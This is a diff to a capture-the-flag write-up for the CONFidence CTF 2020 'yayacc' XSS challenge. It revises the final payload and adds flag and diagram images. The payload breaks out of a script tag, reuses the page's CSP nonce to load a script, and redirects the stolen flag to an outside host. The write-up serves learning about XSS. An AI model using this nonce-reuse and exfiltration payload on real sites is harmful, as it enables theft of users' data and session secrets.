@@ -205,13 +205,18 @@ It's important to note that this will not reference the script element if the co
 <p>Our final payload should look like this : </p>
 
 ```javascript
-</script><meta http-equiv="refresh" content="0;URL=http://yayacc.zajebistyc.tf/note/48ab77af-f06d-48d5-a6d2-fba6ddcc8227?theme=`color:red`>;}var oldsc=document.currentScript.nonce;var sc =document.createElement(`script`);sc.nonce=oldsc;sc.src=`/flag?var=flag`;document.querySelector(`html`).appendChild(sc);setTimeout(function(){document.location=`https://ctf.warriordev.com/ctfserver/ref?flag=${flag}`},100);{//
+</script><meta http-equiv="refresh" content="0;URL=http://yayacc.zajebistyc.tf/note/48ab77af-f06d-48d5-a6d2-fba6ddcc8227?theme=`color:red`;}var oldsc=document.currentScript.nonce;var sc =document.createElement(`script`);sc.nonce=oldsc;sc.src=`/flag?var=flag`;document.querySelector(`html`).appendChild(sc);setTimeout(function(){document.location=`https://ctf.warriordev.com/ctfserver/ref?flag=${flag}`},100);{//
 
 ```
+
+<b> FLAG : </b>
+
+![flag](https://github.com/DejanJS/CONFidence-CTF-2020-yayacc/blob/master/flag.png)
+
 <h4>Diagram</h4>
 <p>This is just my random drawing to visualize what is going on.</p>
 
-
+<img src="https://github.com/DejanJS/CONFidence-CTF-2020-yayacc/blob/master/diagram.png" width="700px" height="700px">
 
 <h4>Summary part 1</h4>
 <p>This challenge was very hard and made in pretty realistic scenario props to folks from <a href="https://p4.team/">p4</a>. I hope part 1 of this writeup will help someone to understand some of complexity of XSS attacks.  </p>
